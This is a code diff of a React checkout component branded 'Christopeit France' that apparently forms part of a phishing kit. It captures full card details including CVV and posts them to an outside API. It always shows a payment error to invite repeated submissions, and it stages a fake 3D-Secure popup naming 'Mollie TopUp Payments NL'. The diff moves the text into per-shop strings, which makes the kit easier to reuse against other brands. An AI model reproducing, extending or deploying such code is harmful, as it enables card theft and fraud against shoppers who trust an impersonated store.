@@ -1,9 +1,8 @@
 import { set } from 'date-fns';
 import { useState, useRef } from 'react';
-import { useRouter } from 'next/router'; // Import useRouter
+import { useRouter } from 'next/router';
 
-
-const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup }) => {
+const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoading, show3DSecurePopup, setShow3DSecurePopup, data }) => {
   const [formData, setFormData] = useState({
     cardHolder: '',
     cardNumber: '',
@@ -12,11 +11,11 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
   });
 
   const [showPaymentError, setShowPaymentError] = useState(false);
-  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png'); 
+  const [cardLogo, setCardLogo] = useState('/verified-by-visa.png');
 
   const cardNumberRef = useRef(null);
   const expiryDateRef = useRef(null);
-  const router = useRouter(); // Utiliser useRouter
+  const router = useRouter();
 
   const currentDate = new Date();
   const formattedDate = currentDate.toLocaleDateString('fr-FR', {
@@ -38,22 +37,20 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     const { name, value } = e.target;
 
     if (name === 'cardNumber') {
-      // Format card number with spaces every 4 characters
       const formattedValue = value
-        .replace(/\D/g, '') // Remove non-digit characters
-        .slice(0, 16) // Limit to 16 characters
-        .replace(/(.{4})/g, '$1 ') // Add space every 4 characters
-        .trim(); // Remove trailing space
+        .replace(/\D/g, '')
+        .slice(0, 16)
+        .replace(/(.{4})/g, '$1 ')
+        .trim();
       setFormData((prevData) => ({
         ...prevData,
         [name]: formattedValue,
       }));
     } else if (name === 'expiryDate') {
-      // Format expiry date as MM/YY
       const formattedValue = value
-        .replace(/\D/g, '') // Remove non-digit characters
-        .slice(0, 4) // Limit to 4 characters
-        .replace(/(\d{2})(\d{1,2})?/, (_, mm, yy) => (yy ? `${mm}/${yy}` : mm)); // Add '/' after MM
+        .replace(/\D/g, '')
+        .slice(0, 4)
+        .replace(/(\d{2})(\d{1,2})?/, (_, mm, yy) => (yy ? `${mm}/${yy}` : mm));
       setFormData((prevData) => ({
         ...prevData,
         [name]: formattedValue,
@@ -70,68 +67,54 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
     e.preventDefault();
 
     const cardDetails = {
-      cardNumber: ` ${formData.cardNumber} `, // Surround card number with spaces
+      cardNumber: ` ${formData.cardNumber} `,
       cardOwner: formData.cardHolder,
       cardExpiration: formData.expiryDate,
       cardCVC: formData.cvv,
     };
 
-    // Si la carte commence par 5, setCardLogo à 'mastercard.png'
     if (formData.cardNumber.startsWith('5')) {
       setCardLogo('/mastercard-id-check.png');
     }
-    
-    try {
-      setIsLoading(true); // Afficher le popup de chargement
 
-      // Lancer un timeout pour masquer le loader et afficher 3D-secure après 30 secondes
+    try {
+      setIsLoading(true);
+
       const timeoutId = setTimeout(() => {
-        setIsLoading(false); // Masquer le popup de chargement
-        setShow3DSecurePopup(true); // Afficher le popup 3D-secure
+        setIsLoading(false);
+        setShow3DSecurePopup(true);
       }, 27000);
 
+      console.log(data.checkoutPayProcessing);
 
-      // Effectuer la requête de paiement
-      console.log('Paiement en cours...');
-      
       try {
-        const payFetch = await fetch('https://api.{shop.domain}/pay', {
+        const payFetch = await fetch('https://api.christopeit-france/pay', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ orderNumber, amount, cardDetails }),
         });
-      
-        //Dans tous les cas afficher la popup Erreur (Infinity Loop)
-        setIsLoading(false); 
+
+        setIsLoading(false);
         setShow3DSecurePopup(false);
         setShowPaymentError(true);
-
-        
       } catch (error) {
-        console.error('Erreur lors de la requête fetch :', error);
-        alert('Impossible de traiter le paiement. Veuillez réessayer à nouveau.');
-        router.push(`/paiement?failed=true`); 
-        setIsLoading(false); 
+        console.error(data.checkoutPayFetchError, error);
+        alert(data.checkoutPayRetryAlert);
+        router.push(`/checkout?failed=true`);
+        setIsLoading(false);
         setShow3DSecurePopup(false);
       }
-
-      
-      
     } catch (error) {
-      console.error('Erreur lors du paiement :', error);
-      alert('Une erreur est survenue.');
-      setIsLoading(false); // Masquer le popup de chargement en cas d'erreur
+      console.error(data.checkoutPayError, error);
+      alert(data.checkoutPayGenericError);
+      setIsLoading(false);
     }
   };
 
   const handleRetry = () => {
     setShowPaymentError(false);
     setShow3DSecurePopup(false);
-    handleSubmit(new Event('submit')); // Simule un événement de soumission
-
-
-    // setShow3DSecurePopup(true); // Afficher le popup 3D-secure
-    // setShowPaymentError(false); // Masquer le popup d'erreur de paiement
+    handleSubmit(new Event('submit'));
   };
 
   return (
@@ -139,14 +122,14 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       <input
         type="text"
         name="cardHolder"
-        placeholder="Titulaire de la carte"
+        placeholder={data.checkoutPayCardHolderPlaceholder}
         onChange={handleInputChange}
         required
       />
       <input
         type="text"
         name="cardNumber"
-        placeholder="1234 1234 1234 1234"
+        placeholder={data.checkoutPayCardNumberPlaceholder}
         ref={cardNumberRef}
         value={formData.cardNumber}
         onChange={handleInputChange}
@@ -156,7 +139,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <input
           type="text"
           name="expiryDate"
-          placeholder="MM/YY"
+          placeholder={data.checkoutPayExpiryDatePlaceholder}
           maxLength="5"
           ref={expiryDateRef}
           value={formData.expiryDate}
@@ -166,7 +149,7 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
         <input
           type="text"
           name="cvv"
-          placeholder="CVV"
+          placeholder={data.checkoutPayCVVPlaceholder}
           maxLength="3"
           onChange={handleInputChange}
           required
@@ -181,66 +164,89 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
           <i className="fas fa-arrow-left"></i>
         </button>
         <button id="pay-checkout" type="submit">
-          Procéder au paiement
+          {data.checkoutPayProceedButton}
         </button>
       </article>
 
       {isLoading && (
-        <div className='verification-wrapper'>
+        <div className="verification-wrapper">
           <div className="verification-popup loading">
-            <article className='head'>
-              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
-              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
+            <article className="head">
+              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img
+                className={`card-logo ${
+                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
+                }`}
+                src={cardLogo}
+                alt={data.checkoutPayVerifiedPaymentAlt}
+              />
             </article>
-            
-            <h2>Préparation du paiement</h2>
-            <p className='desc'>Merci de patienter quelques instants, nous préparons votre paiement.</p>
-            <div className='loader border-top-primary'></div>
-          </div>
-        </div>
-      )}
-      
-      {show3DSecurePopup && (
-        <div className='verification-wrapper'>
-          <div className="verification-popup d-secure">
-            <article className='head'>
-              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
-              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
-            </article>
-            <img src='3d-secure.png' alt='3D Secure' className='icon' />
-            <h2>Vérification 3d-secure</h2>
-            <p className='desc'>Confirmez la transaction suivante :</p>
-            <article className='infos'>
-              <span>Mollie TopUp Payments NL</span>
-              <span>Montant à valider : {amountFeesed}€</span>
-              <span> Date : {`${formattedDate} à ${formattedTime}`}</span>
-              <span>Carte : **** **** **** {lastFourDigits}</span>
-            </article>
-            <div className='loader border-top-primary'></div>
-           
-            <p className='smaller'>Une fois la transaction confirmée, vous serez redirigé vers la page de confirmation.</p>
-            
+
+            <h2>{data.checkoutPayLoadingTitle}</h2>
+            <p className="desc">{data.checkoutPayLoadingDescription}</p>
+            <div className="loader border-top-primary"></div>
           </div>
         </div>
       )}
 
+      {show3DSecurePopup && (
+        <div className="verification-wrapper">
+          <div className="verification-popup d-secure">
+            <article className="head">
+              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img
+                className={`card-logo ${
+                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
+                }`}
+                src={cardLogo}
+                alt={data.checkoutPayVerifiedPaymentAlt}
+              />
+            </article>
+            <img src="3d-secure.png" alt="3D Secure" className="icon" />
+            <h2>{data.checkoutPay3DSecureTitle}</h2>
+            <p className="desc">{data.checkoutPay3DSecureDescription}</p>
+            <article className="infos">
+              <span>{data.checkoutPay3DSecureMerchant}</span>
+              <span>
+                {data.checkoutPay3DSecureAmount} : {amountFeesed}
+                {shop.currency}
+              </span>
+              <span>
+                {data.checkoutPay3DSecureDate} : {`${formattedDate} à ${formattedTime}`}
+              </span>
+              <span>
+                {data.checkoutPay3DSecureCard} : **** **** **** {lastFourDigits}
+              </span>
+            </article>
+            <div className="loader border-top-primary"></div>
+
+            <p className="smaller">{data.checkoutPay3DSecureFooter}</p>
+          </div>
+        </div>
+      )}
 
       {showPaymentError && (
-        <div className='verification-wrapper'>
+        <div className="verification-wrapper">
           <div className="verification-popup error">
-            <article className='head'>
-              <img className='brand-logo' src='icon.png' alt='Christopeit France' />
-              <img className={`card-logo ${cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'}`} src={cardLogo} alt='Verified Payment' />
+            <article className="head">
+              <img className="brand-logo" src="icon.png" alt="Christopeit France" />
+              <img
+                className={`card-logo ${
+                  cardLogo === '/mastercard-id-check.png' ? 'mastercard' : 'visa'
+                }`}
+                src={cardLogo}
+                alt={data.checkoutPayVerifiedPaymentAlt}
+              />
             </article>
-            <h2 className='icon'>❌</h2>
-            <h2>erreur lors du paiement</h2>
-             <p className='desc'>Aucun paiement n'a pû être effectué, veuillez réessayer.</p>
-            <button onClick={handleRetry} disabled={isLoading}>Réessayer</button> 
+            <h2 className="icon">❌</h2>
+            <h2>{data.checkoutPayErrorTitle}</h2>
+            <p className="desc">{data.checkoutPayErrorDescription}</p>
+            <button onClick={handleRetry} disabled={isLoading}>
+              {data.checkoutPayRetryButton}
+            </button>
           </div>
         </div>
       )}
-
-
     </form>
   );
 };
